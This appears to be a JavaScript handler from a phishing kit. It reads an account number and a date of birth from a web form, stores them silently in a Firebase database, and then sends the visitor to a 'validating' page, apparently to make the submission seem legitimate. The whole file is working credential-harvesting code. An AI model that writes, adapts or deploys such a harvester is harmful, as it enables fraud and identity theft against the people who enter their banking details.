// Reference your database
var ududip005DB = firebase.database().ref("ududip005");

// Handle form submission
document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    // Get form values
    var uacno = getElementVal("uacno");
    var udob = getElementVal("udob");

    // Save form data to Firebase
    saveMessages(uacno, udob);

    // Redirect to validating page
    window.location.href = "validn.html";
}

// Save form data to Firebase
function saveMessages(uacno,  udob) {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        Ac_Number: uacno,
        Date_of_Birth: udob
    });
}

// Get element value by ID
function getElementVal(id) {
    return document.getElementById(id).value;
}